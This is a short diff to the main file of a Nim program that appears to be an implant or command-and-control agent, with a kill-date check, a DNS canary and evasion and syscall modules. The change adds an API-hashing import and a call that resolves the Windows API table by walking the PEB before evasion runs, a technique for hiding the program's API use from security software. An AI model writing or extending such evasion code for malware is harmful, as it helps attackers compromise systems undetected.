@@ -6,6 +6,7 @@
 import std/[os, times, strutils, random]
 when defined(windows):
   import winim/lean
+  import api_hash
 import config, transport, commands, evasion, syscalls
 
 # ── DNS canary ────────────────────────────────────────────────────────────────
@@ -41,6 +42,9 @@ proc main() =
   randomize()
 
   killDateCheck()
+
+  when defined(windows):
+    initApi()   # Resolve API table via PEB walk — must run before applyEvasion
 
   when not defined(noEvasion):
     applyEvasion()
